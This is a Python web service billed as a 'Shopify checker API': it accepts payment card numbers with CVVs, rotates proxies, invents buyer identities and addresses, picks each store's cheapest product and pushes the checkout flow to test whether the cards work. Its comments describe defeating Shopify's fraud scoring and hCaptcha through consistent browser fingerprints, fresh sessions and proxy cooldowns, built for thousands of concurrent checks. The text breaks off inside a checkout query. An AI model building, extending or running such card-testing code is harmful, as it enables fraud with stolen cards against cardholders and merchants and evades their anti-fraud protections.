#!/usr/bin/env python3
# ==============================================================================
#  SHOPIFY CHECKER API  —  MERGED + FIXED EDITION  v5
# ==============================================================================
#  ENDPOINTS
#    GET  /shopify?site=DOMAIN&card=CARD|MM|YYYY|CVV&proxy=host:port
#    GET  /shopify?site=DOMAIN&cc=CARD|MM|YYYY|CVV&proxy=...        (cc alias)
#    POST /batch   { "site": "...", "cards": [...], "proxies": [...] }
#    GET  /status
#    GET  /stats
#    GET  /
#
#  OPTIONAL QUERY / BODY PARAMS
#    variant=<id>          force a product variant
#    key=<name>            per-user concurrency lane
#    retries=<n>           override MAX_RETRIES for this call
#    first,last,email,phone,address1,city,state,zip,country   address override
#
#  FIXES vs old v4  (why CAPTCHA_REQUIRED was coming)
#  -----------------------------------------------------------------------------
#   [FIX-1] COHERENT FINGERPRINT.
#           Old code: random UA from a pool of Chrome100-131/Edge/Firefox/Safari
#           but ALWAYS sent Chrome-131 `sec-ch-ua` + platform "Windows".
#           Firefox UA + Chromium hints  ->  Shopify risk score  ->  hCaptcha.
#           Now UA and client-hints are generated as ONE PAIR.
#
#   [FIX-2] ONE FINGERPRINT PER SESSION.
#           Old code generated a new random UA for the products call and again
#           for the checkout call inside the same aiohttp session.
#           Now the same fp object is threaded through every hop.
#
#   [FIX-3] force_close=True connector (matches the build that works).
#           keepalive_timeout=25 was reusing proxy tunnels across the checkout
#           handshake; some residential gateways rotate the exit IP on reconnect.
#
#   [FIX-4] CAPTCHA RETRY = fresh fingerprint + fresh session.
#           Old code retried captcha with yet another random UA on the same
#           connection. Now it is deliberate: new fp, small backoff.
#
#   [FIX-5] MULTI-PORT in one process (PORT + EXTRA_PORTS).
#           nginx  ->  127.0.0.1:8083   (keeps /api1/shopify working)
#           direct ->  0.0.0.0:9092     (IP:9092/shopify)
#
#   [FIX-6] Full working flow merged in: term-accept loop, delivery
#           re-negotiate, progressive-rate poll, digital / no-ship branch,
#           typed SubmitRejected code handling, robust poll.
#
#  RUN
#    pip install flask aiohttp aiohttp-socks waitress
#    python app.py                      # 8083 + 9092 both
#    python app.py --port 9092          # single port
#    python app.py --port 9092 --extra-ports ""     # only 9092
#
#  ENV
#    PORT, EXTRA_PORTS, THREADS, GLOBAL_MAX_CONCUR, PER_USER_CONCUR,
#    MAX_RETRIES, CAPTCHA_RETRY, REQ_TOTAL_TIMEOUT, START_STAGGER,
#    FORCE_CLOSE, SITE_CACHE_TTL, FINGERPRINT_MODE (fixed|random)
# ==============================================================================

import os
import re
import sys
import time
import json
import uuid
import random
import string
import asyncio
import threading
import logging
import argparse
from urllib.parse import urlparse, quote

import aiohttp
from flask import Flask, request, jsonify


# ==============================================================================
#  CONFIG
# ==============================================================================

def _env_int(name, default):
    try:
        return int(os.environ.get(name, default))
    except (TypeError, ValueError):
        return default


def _env_float(name, default):
    try:
        return float(os.environ.get(name, default))
    except (TypeError, ValueError):
        return default


def _env_bool(name, default):
    v = os.environ.get(name)
    if v is None:
        return default
    return str(v).strip().lower() in ("1", "true", "yes", "on")


PORT               = _env_int("PORT", 8083)
_EXTRA_PORTS_RAW   = os.environ.get("EXTRA_PORTS", "9092")
THREADS            = _env_int("THREADS", 200)
GLOBAL_MAX_CONCUR  = _env_int("GLOBAL_MAX_CONCUR", 3000)
PER_USER_CONCUR    = _env_int("PER_USER_CONCUR", 1200)
MAX_RETRIES        = _env_int("MAX_RETRIES", 1)
CAPTCHA_RETRY      = _env_int("CAPTCHA_RETRY", 1)
REQ_TOTAL_TIMEOUT  = _env_float("REQ_TOTAL_TIMEOUT", 40)
START_STAGGER      = _env_float("START_STAGGER", 0.05)
FORCE_CLOSE        = _env_bool("FORCE_CLOSE", True)
SITE_CACHE_TTL     = _env_float("SITE_CACHE_TTL", 900)
FINGERPRINT_MODE   = os.environ.get("FINGERPRINT_MODE", "fixed").strip().lower()

PROXY_COOLDOWN      = 30
PROXY_GAP           = 3
SITE_PROXY_COOLDOWN = 180
POLL_MAX_SLEEP      = 0.6

API_VERSIONS = ["2025-01", "2024-10", "2024-07", "2024-01"]


# ==============================================================================
#  [FIX-1] FINGERPRINT ENGINE
# ------------------------------------------------------------------------------
#  A fingerprint is a single dict holding UA + matching sec-ch-ua hints.
#  They are ALWAYS created together so they can never disagree.
# ==============================================================================

_WIN   = "Windows NT 10.0; Win64; x64"
_MAC   = "Macintosh; Intel Mac OS X 10_15_7"
_LINUX = "X11; Linux x86_64"


def _fp_chrome(version, platform_ua, platform_hint):
    return {
        "ua": (f"Mozilla/5.0 ({platform_ua}) AppleWebKit/537.36 (KHTML, like Gecko) "
               f"Chrome/{version}.0.0.0 Safari/537.36"),
        "sec-ch-ua": (f'"Google Chrome";v="{version}", "Chromium";v="{version}", '
                      f'"Not_A Brand";v="24"'),
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": f'"{platform_hint}"',
    }


def _fp_edge(version, platform_ua, platform_hint):
    return {
        "ua": (f"Mozilla/5.0 ({platform_ua}) AppleWebKit/537.36 (KHTML, like Gecko) "
               f"Chrome/{version}.0.0.0 Safari/537.36 Edg/{version}.0.0.0"),
        "sec-ch-ua": (f'"Microsoft Edge";v="{version}", "Chromium";v="{version}", '
                      f'"Not_A Brand";v="24"'),
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": f'"{platform_hint}"',
    }


def _build_fp_pool():
    """Coherent (ua, client-hints) pairs. Nothing can mismatch."""
    pool = []
    for v in range(120, 132):
        pool.append(_fp_chrome(v, _WIN, "Windows"))
    for v in range(122, 132):
        pool.append(_fp_chrome(v, _MAC, "macOS"))
    for v in range(124, 132):
        pool.append(_fp_chrome(v, _LINUX, "Linux"))
    for v in (126, 127, 128, 129, 130, 131):
        pool.append(_fp_edge(v, _WIN, "Windows"))
    return pool


_FP_POOL = _build_fp_pool()

# The exact fingerprint that is known to sail through on this store.
FIXED_FP = {
    "ua": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
           "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"),
    "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
}


def new_fingerprint():
    if FINGERPRINT_MODE == "random":
        return random.choice(_FP_POOL)
    return FIXED_FP


# ==============================================================================
#  PROXY HANDLING  (url param > proxies.txt pool > direct)
# ==============================================================================

def _load_proxy_pool():
    pool = []
    candidates = [
        "proxies.txt",
        os.path.join(os.path.dirname(os.path.abspath(__file__)), "proxies.txt"),
    ]
    for path in candidates:
        if os.path.isfile(path):
            try:
                with open(path, "r", encoding="utf-8", errors="ignore") as fh:
                    for line in fh:
                        line = line.strip()
                        if line and not line.startswith("#"):
                            pool.append(line)
            except OSError:
                pass
            break
    return pool


PROXY_POOL = _load_proxy_pool()
_cooldown_proxies = {}
_last_used = {}
_site_proxy_cool = {}
_proxy_failures = {}
_pool_lock = threading.Lock()


def _auto_proxy(explicit=None, exclude_site=None):
    if explicit:
        return explicit
    if not PROXY_POOL:
        return None
    now = time.time()
    site_bad = set()
    if exclude_site:
        site_bad = {p for p, exp in _site_proxy_cool.get(exclude_site, {}).items() if exp > now}
    good = [p for p in PROXY_POOL
            if p not in site_bad
            and _cooldown_proxies.get(p, 0) <= now
            and (_last_used.get(p, 0) + PROXY_GAP <= now)]
    if good:
        chosen = random.choice(good)
        _last_used[chosen] = now
        return chosen
    with _pool_lock:
        _cooldown_proxies.clear()
        _last_used.clear()
    chosen = random.choice(PROXY_POOL)
    _last_used[chosen] = now
    return chosen


def _cooldown_proxy(p):
    if p:
        _cooldown_proxies[p] = time.time() + PROXY_COOLDOWN


def _mark_proxy_fail(p):
    if not p or p not in PROXY_POOL:
        return
    _proxy_failures[p] = _proxy_failures.get(p, 0) + 1
    if _proxy_failures[p] >= 3:
        with _pool_lock:
            if p in PROXY_POOL:
                PROXY_POOL.remove(p)
        _cooldown_proxies.pop(p, None)
        _last_used.pop(p, None)
        _proxy_failures.pop(p, None)


def _cooldown_site_proxy(site, p):
    if not site or not p:
        return
    key = urlparse(site).netloc if site.startswith("http") else site
    _site_proxy_cool.setdefault(key, {})[p] = time.time() + SITE_PROXY_COOLDOWN


def parse_proxy(proxy_str):
    """Normalize any proxy format into something aiohttp/aiohttp-socks accepts."""
    if proxy_str is None:
        return None
    raw = str(proxy_str).strip().strip("'\"")
    if not raw:
        return None

    low = raw.lower()
    scheme = "http"
    for pfx in ("socks5h://", "socks5://", "socks4a://", "socks4://",
                "socks://", "https://", "http://"):
        if low.startswith(pfx):
            scheme = pfx.rstrip(":/")
            scheme = scheme.replace("socks5h", "socks5").replace("socks4a", "socks4")
            if scheme == "socks":
                scheme = "socks5"
            raw = raw[len(pfx):]
            break

    if "@" in raw:
        auth, hostport = raw.rsplit("@", 1)
        auth = auth.lstrip("/")
        hostport = hostport.strip("/")
        if ":" not in hostport:
            return None
        host, port = hostport.rsplit(":", 1)
        if not host or not port:
            return None
        user, _, pw = auth.partition(":")
        return f"{scheme}://{quote(user, safe='')}:{quote(pw, safe='')}@{host}:{port}"

    parts = raw.strip("/").split(":")
    if len(parts) == 2:
        host, port = parts
        if not host or not port:
            return None
        return f"{scheme}://{host}:{port}"
    if len(parts) == 4:
        if parts[1].isdigit():
            host, port, user, pw = parts
        elif parts[3].isdigit():
            user, pw, host, port = parts
        else:
            host, port, user, pw = parts
        return f"{scheme}://{quote(user, safe='')}:{quote(pw, safe='')}@{host}:{port}"
    return None


def is_socks(p):
    return bool(p) and p.lower().startswith(("socks://", "socks4://", "socks5://"))


def build_connector(proxy_url=None):
    """[FIX-3] force_close connector by default."""
    if proxy_url and is_socks(proxy_url):
        try:
            from aiohttp_socks import ProxyConnector
        except ImportError as exc:
            raise RuntimeError("SOCKS proxy needs: pip install aiohttp-socks") from exc
        return ProxyConnector.from_url(proxy_url, rdns=True, ssl=False), None

    if FORCE_CLOSE:
        conn = aiohttp.TCPConnector(ssl=False, limit=0, limit_per_host=0, force_close=True)
    else:
        conn = aiohttp.TCPConnector(
            ssl=False, limit=0, limit_per_host=0,
            ttl_dns_cache=300, keepalive_timeout=25, enable_cleanup_closed=True,
        )
    return conn, proxy_url


def proxy_status_label(pstr, purl, dead=False):
    if not pstr:
        return "Not Used"
    if dead or not purl:
        return "Dead"
    return "Live"


def is_proxy_err(exc):
    msg = str(exc).lower()
    return any(x in msg for x in (
        "proxy", "socks", "tunnel", "407", "cannot connect to host",
        "connection refused", "network unreachable", "timed out",
        "server disconnected", "clientconnect", "proxyconnection",
    ))


# ==============================================================================
#  ADDRESS BOOK
# ==============================================================================

C2C = {
    "USD": "US", "CAD": "CA", "INR": "IN", "AED": "AE", "HKD": "HK", "GBP": "GB",
    "CHF": "CH", "EUR": "DE", "AUD": "AU", "NZD": "NZ", "JPY": "JP", "SGD": "SG",
    "SEK": "SE", "NOK": "NO", "DKK": "DK", "PLN": "PL", "CZK": "CZ", "MXN": "MX",
    "BRL": "BR", "KRW": "KR", "THB": "TH", "MYR": "MY", "PHP": "PH", "IDR": "ID",
    "TWD": "TW", "ZAR": "ZA", "ILS": "IL", "TRY": "TR", "SAR": "SA", "QAR": "QA",
    "KWD": "KW", "CNY": "CN", "HUF": "HU", "RON": "RO", "BGN": "BG", "CLP": "CL",
    "COP": "CO", "PEN": "PE", "ARS": "AR", "FR": "FR",
}

book = {
    "US": {"address1": "123 Main", "city": "NY", "postalCode": "10080",
           "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
    "CA": {"address1": "88 Queen", "city": "Toronto", "postalCode": "M5J2J3",
           "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198"},
    "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW1 6XE",
           "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123"},
    "IN": {"address1": "221B MG", "city": "Mumbai", "postalCode": "400001",
           "zoneCode": "MH", "countryCode": "IN", "phone": "+91 9876543210"},
    "AE": {"address1": "Burj Tower", "city": "Dubai", "postalCode": "",
           "zoneCode": "DU", "countryCode": "AE", "phone": "+971 50 123 4567"},
    "HK": {"address1": "Nathan 88", "city": "Kowloon", "postalCode": "",
           "zoneCode": "KL", "countryCode": "HK", "phone": "+852 5555 5555"},
    "CN": {"address1": "8 Zhongguancun Street", "city": "Beijing", "postalCode": "100080",
           "zoneCode": "BJ", "countryCode": "CN", "phone": "1062512345"},
    "CH": {"address1": "Gotthardstrasse 17", "city": "Schweiz", "postalCode": "6430",
           "zoneCode": "SZ", "countryCode": "CH", "phone": "445512345"},
    "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000",
           "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
    "DE": {"address1": "Friedrichstr 100", "city": "Berlin", "postalCode": "10117",
           "zoneCode": "BE", "countryCode": "DE", "phone": "3012345678"},
    "FR": {"address1": "1 Rue de Rivoli", "city": "Paris", "postalCode": "75001",
           "zoneCode": "", "countryCode": "FR", "phone": "142345678"},
    "NZ": {"address1": "1 Queen Street", "city": "Auckland", "postalCode": "1010",
           "zoneCode": "AUK", "countryCode": "NZ", "phone": "91234567"},
    "JP": {"address1": "1-1 Marunouchi", "city": "Tokyo", "postalCode": "100-0005",
           "zoneCode": "JP-13", "countryCode": "JP", "phone": "312345678"},
    "SG": {"address1": "1 Raffles Place", "city": "Singapore", "postalCode": "048616",
           "zoneCode": "", "countryCode": "SG", "phone": "61234567"},
    "SE": {"address1": "Drottninggatan 1", "city": "Stockholm", "postalCode": "11151",
           "zoneCode": "", "countryCode": "SE", "phone": "812345678"},
    "NO": {"address1": "Karl Johans gate 1", "city": "Oslo", "postalCode": "0154",
           "zoneCode": "", "countryCode": "NO", "phone": "21234567"},
    "DK": {"address1": "Stroget 1", "city": "Copenhagen", "postalCode": "1000",
           "zoneCode": "", "countryCode": "DK", "phone": "31234567"},
    "MX": {"address1": "Reforma 222", "city": "Mexico City", "postalCode": "06600",
           "zoneCode": "CDMX", "countryCode": "MX", "phone": "5512345678"},
    "BR": {"address1": "Av Paulista 1000", "city": "Sao Paulo", "postalCode": "01310-100",
           "zoneCode": "SP", "countryCode": "BR", "phone": "1112345678"},
    "DEFAULT": {"address1": "123 Main", "city": "New York", "postalCode": "10080",
                "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
}


def pick_addr(url, cc=None, rc=None, overrides=None):
    cc = (cc or "").upper()
    rc = (rc or "").upper()
    tcn = urlparse(url).netloc.split(".")[-1].upper()
    if tcn in book:
        base = dict(book[tcn])
    else:
        ccn = C2C.get(cc)
        if rc in book and ccn == rc:
            base = dict(book[rc])
        elif rc in book:
            base = dict(book[rc])
        elif ccn and ccn in book:
            base = dict(book[ccn])
        else:
            base = dict(book["DEFAULT"])
    if overrides:
        for key, val in overrides.items():
            if val not in (None, ""):
                base[key] = val
    return base


# ==============================================================================
#  GENERIC HELPERS
# ==============================================================================

def extract_between(text, start, end):
    if not text or not start or not end:
        return None
    try:
        if start in text:
            rest = text.split(start, 1)[1]
            if end in rest:
                val = rest.split(end, 1)[0]
                return val if val else None
    except Exception:
        pass
    return None


_UUID_RE = re.compile(
    r"[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}"
)


def _unescape(text):
    if not text:
        return ""
    out = (text.replace("&quot;", '"').replace("&#34;", '"').replace("&#39;", "'")
                .replace("&amp;", "&").replace("\\u0022", '"').replace("\\u0027", "'")
                .replace('\\"', '"'))
    try:
        import html as _html
        out = _html.unescape(out)
    except Exception:
        pass
    return out


def extract_stable_id(text):
    if not text:
        return None
    raw = _unescape(text)
    cands = []
    for src, s, e in (
        (text, "stableId&quot;:&quot;", "&quot;"),
        (text, "stableId&#34;:&#34;", "&#34;"),
        (raw, '"stableId":"', '"'),
        (raw, 'stableId":"', '"'),
    ):
        val = extract_between(src, s, e)
        if val:
            cands.append(val.strip())
    for src in (raw, text):
        for m in re.finditer(r"stableId", src, re.I):
            cands.extend(_UUID_RE.findall(src[m.start():m.start() + 120]))
    seen, ordered = set(), []
    for c in cands:
        c = c.strip().strip("\\").strip('"').strip("'")
        if c and c not in seen:
            seen.add(c)
            ordered.append(c)
    for c in ordered:
        if _UUID_RE.fullmatch(c):
            return c
    for c in ordered:
        if re.fullmatch(r"[0-9a-fA-F]{32}", c):
            return f"{c[0:8]}-{c[8:12]}-{c[12:16]}-{c[16:20]}-{c[20:32]}".lower()
    return None


def rand_str(n=11):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


class Utils:
    @staticmethod
    def name():
        firsts = ["James", "John", "Robert", "Michael", "William", "David",
                  "Mary", "Patricia", "Jennifer", "Linda"]
        lasts = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia",
                 "Miller", "Davis", "Rodriguez"]
        return random.choice(firsts), random.choice(lasts)

    @staticmethod
    def email(f, l):
        domains = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com"]
        return f"{f.lower()}.{l.lower()}{random.randint(100, 9999)}@{random.choice(domains)}"


# ==============================================================================
#  SITE / VARIANT CACHE
# ==============================================================================

_SITE_CACHE = {}
_site_cache_lock = threading.Lock()


def _cache_get(site):
    with _site_cache_lock:
        entry = _SITE_CACHE.get(site)
        if entry and (time.time() - entry[1]) < SITE_CACHE_TTL:
            return entry[0]
    return None


def _cache_set(site, variant):
    with _site_cache_lock:
        _SITE_CACHE[site] = (variant, time.time())


def _norm(domain):
    d = domain if domain.startswith("http") else "https://" + domain
    return d.rstrip("/")


# ==============================================================================
#  [FIX-1][FIX-2] HEADERS — fingerprint is threaded through, never regenerated
# ==============================================================================

def _product_headers(domain, fp):
    base = _norm(domain)
    return {
        "User-Agent": fp["ua"],
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": base + "/",
    }


def _document_headers(domain, fp):
    base = _norm(domain)
    return {
        "User-Agent": fp["ua"],
        "Accept": ("text/html,application/xhtml+xml,application/xml;q=0.9,"
                   "image/avif,image/webp,*/*;q=0.8"),
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": base + "/",
        "sec-ch-ua": fp["sec-ch-ua"],
        "sec-ch-ua-mobile": fp["sec-ch-ua-mobile"],
        "sec-ch-ua-platform": fp["sec-ch-ua-platform"],
        "Upgrade-Insecure-Requests": "1",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
    }


def _checkout_headers(domain, fp):
    base = _norm(domain)
    return {
        "User-Agent": fp["ua"],
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/json",
        "Origin": base,
        "Referer": base + "/",
        "sec-ch-ua": fp["sec-ch-ua"],
        "sec-ch-ua-mobile": fp["sec-ch-ua-mobile"],
        "sec-ch-ua-platform": fp["sec-ch-ua-platform"],
    }


# ==============================================================================
#  CAPTCHA / RESPONSE CLASSIFIERS
# ==============================================================================

def is_captcha(text):
    if not text:
        return False
    up = text.upper()
    return any(x in up for x in (
        "CAPTCHA_REQUIRED", '"CODE":"CAPTCHA_REQUIRED"',
        "CAPTCHA REQUIRED", "HCAPTCHA", "H-CAPTCHA",
    ))


def _nonjson_code(status, body):
    if status in (429, 430, 503):
        return "RATE_LIMITED"
    t = (body or "").lstrip()
    low = t[:300].lower()
    if not t:
        return "RATE_LIMITED"
    if t.startswith("<!") or t.startswith("<html") or "<html" in low[:80]:
        if any(x in low for x in ("captcha", "challenge", "bot")):
            return "CAPTCHA_REQUIRED"
        return "RATE_LIMITED"
    if "throttl" in low or "too many" in low or "rate limit" in low:
        return "RATE_LIMITED"
    return "UNPARSEABLE_RESPONSE"


def clean_resp(message):
    if not message:
        return "UNKNOWN_ERROR"
    m = str(message)
    if "3DS_REQUIRED" in m.upper():
        return "3DS_REQUIRED"
    cm = re.search(r'"code"\s*:\s*"([^"]+)"', m)
    if cm:
        return cm.group(1)
    s = m.strip()
    if re.match(r"^[A-Z][A-Z0-9_]+$", s):
        return s
    return m[:80]


# ==============================================================================
#  STOREFRONT PRODUCTS
# ==============================================================================

PRODUCTS_Q = """query FetchProducts($first:Int!){products(first:$first){edges{node{handle variants(first:50){edges{node{id availableForSale requiresShipping price{amount}}}}}}}}"""


def _vid_from_gid(gid):
    m = re.search(r"ProductVariant/(\d+)", str(gid or ""))
    return m.group(1) if m else None


def _pick_cheapest(data, domain):
    bands = (1.0, 5.0, 10.0, float("inf"))
    best = {b: {"ship": None, "sp": float("inf"), "any": None, "ap": float("inf")} for b in bands}
    for edge in (data.get("products") or {}).get("edges") or []:
        node = edge.get("node") or {}
        handle = node.get("handle", "")
        for ve in (node.get("variants") or {}).get("edges") or []:
            v = ve.get("node") or {}
            if not v.get("availableForSale"):
                continue
            vid = _vid_from_gid(v.get("id"))
            if not vid:
                continue
            try:
                price = float(str((v.get("price") or {}).get("amount", "0")).replace(",", ""))
            except (ValueError, TypeError):
                continue
            if price <= 0:
                continue
            cand = {"site": domain, "price": f"{price:.2f}", "variant_id": str(vid),
                    "link": f"{domain}/products/{handle}" if handle else domain}
            for b in bands:
                if price <= b:
                    slot = best[b]
                    if v.get("requiresShipping", True) and price < slot["sp"]:
                        slot["sp"] = price
                        slot["ship"] = cand
                    if price < slot["ap"]:
                        slot["ap"] = price
                        slot["any"] = cand
                    break
    for b in bands:
        picked = best[b]["ship"] or best[b]["any"]
        if picked:
            return picked
    return None


def _pick_cheapest_json(products, domain):
    best = None
    best_price = float("inf")
    for p in products:
        handle = p.get("handle", "")
        for v in p.get("variants") or []:
            if not v.get("available", True):
                continue
            try:
                price = float(str(v.get("price", "0")).replace(",", ""))
            except (ValueError, TypeError):
                continue
            if price <= 0 or price >= best_price:
                continue
            best_price = price
            best = {"site": domain, "price": f"{price:.2f}", "variant_id": str(v["id"]),
                    "link": f"{domain}/products/{handle}" if handle else domain}
    return best


async def _gql_products(session, domain, ver, proxy, headers):
    url = f"{domain}/api/{ver}/graphql.json"
    async with session.post(url, json={"query": PRODUCTS_Q, "variables": {"first": 100}},
                            headers={**headers, "Content-Type": "application/json"},
                            proxy=proxy, timeout=12) as r:
        if r.status != 200:
            return None, f"status {r.status}"
        try:
            body = await r.json()
        except Exception:
            return None, "bad json"
        if body.get("errors"):
            return None, body["errors"][0].get("message", "gql err")
        return body.get("data"), None


async def _json_products(session, domain, proxy, headers):
    try:
        async with session.get(f"{domain}/products.json", proxy=proxy, timeout=12,
                               headers={"User-Agent": headers["User-Agent"], "Accept": "*/*"}) as r:
            if r.status != 200:
                return None
            txt = await r.text()
            if "shopify" not in txt.lower():
                return None
            data = json.loads(txt)
            prods = data.get("products") or []
            if not prods:
                return None
            return _pick_cheapest_json(prods, domain)
    except Exception:
        return None


async def fetch_products(domain, proxy_str=None, session=None, request_proxy=None, fp=None):
    try:
        domain = _norm(domain)
        if fp is None:
            fp = new_fingerprint()
        headers = _product_headers(domain, fp)
        own = session is None
        if own:
            purl = parse_proxy(proxy_str) if proxy_str else None
            conn, request_proxy = build_connector(purl)
            session = aiohttp.ClientSession(connector=conn,
                                            timeout=aiohttp.ClientTimeout(total=12),
                                            headers=headers)
        try:
            data = None
            last = None
            for ver in API_VERSIONS:
                data, err = await _gql_products(session, domain, ver, request_proxy, headers)
                if data and data.get("products"):
                    break
                last = err
                if err and "404" not in str(err):
                    break
            if data and data.get("products"):
                picked = _pick_cheapest(data, domain)
                if picked:
                    return picked
            picked = await _json_products(session, domain, request_proxy, headers)
            if picked:
                return picked
            return False, ("Storefront GraphQL failed" if last else "No Valid Products")
        finally:
            if own:
                await session.close()
    except (aiohttp.ClientError, OSError) as e:
        return False, f"Proxy Error: {e}"
    except Exception as e:
        return False, f"error: {e}"


# ==============================================================================
#  GRAPHQL DOCUMENTS
# ==============================================================================

QUERY_PROPOSAL_SHIPPING = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}...on ApplyChangeViolation{target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on GenericError{__typename}...on PendingTermViolation{__typename}__typename}}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount 